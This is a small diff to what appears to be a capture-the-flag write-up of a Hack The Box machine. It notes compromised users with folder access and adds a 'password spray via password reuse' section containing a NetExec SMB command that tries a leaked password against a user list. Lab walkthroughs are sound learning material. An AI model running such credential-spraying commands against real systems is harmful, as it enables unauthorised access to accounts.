@@ -332,3 +332,10 @@ Looks to be all the user folders
 
 I have read and write ab both of my compromised users!
 
+# Password spray via password reuse
+
+```python
+nxc smb research.search.htb -u users.txt -p '@3ONEmillionbaby' --continue-on-success
+
+
+```
